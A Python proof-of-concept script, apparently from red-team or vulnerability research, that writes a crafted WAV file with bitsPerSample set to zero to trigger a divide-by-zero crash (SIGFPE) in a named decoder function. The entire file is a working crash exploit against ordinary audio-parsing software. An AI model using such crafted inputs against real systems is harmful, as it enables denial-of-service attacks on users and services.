#!/usr/bin/env python3
"""Red Team PoC — WAV Parser Division by Zero (SIGFPE Crash)
Target: MiniAudioDecoder.cpp:123 → size_t samplesCount = dataSize / (bitsPerSample / 8)
bitsPerSample=0 → divide by zero → SIGFPE
"""
import struct, sys, os

def build_wav(bits_per_sample):
    """
    Builds a minimal RIFF/WAVE byte sequence containing a `fmt ` chunk and a `data` chunk with the specified bits-per-sample value.
    
    The returned bytes form a valid RIFF/WAVE file where the `bitsPerSample` field in the `fmt ` chunk is set to `bits_per_sample` (16-bit little-endian at offset 34) and the RIFF size header is updated to match the total file length.
    
    Parameters:
        bits_per_sample (int): Value written into the `fmt ` chunk's `bitsPerSample` field (0–65535).
    
    Returns:
        bytes: The complete WAV file bytes.
    """
    b = bytearray()
    # RIFF header: 12 bytes
    b += b'RIFF'                                    # 0-3
    riff_size_pos = len(b)
    b += struct.pack('<I', 0)                        # 4-7: placeholder
    b += b'WAVE'                                    # 8-11
    
    # fmt chunk: 24 bytes
    b += b'fmt '                                    # 12-15
    b += struct.pack('<I', 16)                       # 16-19: chunkSize
    b += struct.pack('<H', 1)                        # 20-21: audioFormat=PCM
    b += struct.pack('<H', 1)                        # 22-23: numChannels
    b += struct.pack('<I', 44100)                    # 24-27: sampleRate
    b += struct.pack('<I', 44100)                    # 28-31: byteRate
    b += struct.pack('<H', 1)                        # 32-33: blockAlign
    b += struct.pack('<H', bits_per_sample)          # 34-35: bitsPerSample ← TRIGGER
    
    # data chunk: 10 bytes
    b += b'data'                                    # 36-39
    b += struct.pack('<I', 2)                        # 40-43: dataSize
    b += b'\x00\x00'                                # 44-45: payload
    
    # Fix RIFF size
    struct.pack_into('<I', b, riff_size_pos, len(b) - 8)
    return bytes(b)

def main():
    """
    Create a proof-of-concept WAV file with bitsPerSample set to 0, write it to disk, and print file details and a verification readback.
    
    The function writes a minimal RIFF/WAVE byte sequence produced by build_wav(bits_per_sample=0) to the path given by the first command-line argument or 'poc_divzero.wav' by default, prints the output filename and size, logs the intended divide-by-zero crash condition, and verifies the written `bitsPerSample` value by reading the 16-bit little-endian field at offset 34.
    """
    output = sys.argv[1] if len(sys.argv) > 1 else 'poc_divzero.wav'
    wav = build_wav(bits_per_sample=0)
    with open(output, 'wb') as f:
        f.write(wav)
    sz = os.path.getsize(output)
    print(f"[+] PoC: {output} ({sz} bytes)")
    print("[+] bitsPerSample=0 → dataSize/(0/8) → SIGFPE → crash")
    
    # Verify: bitsPerSample is at offset 34
    bps = struct.unpack('<H', wav[34:36])[0]
    print(f"[+] Verified: bitsPerSample={bps}")

if __name__ == '__main__':
    main()
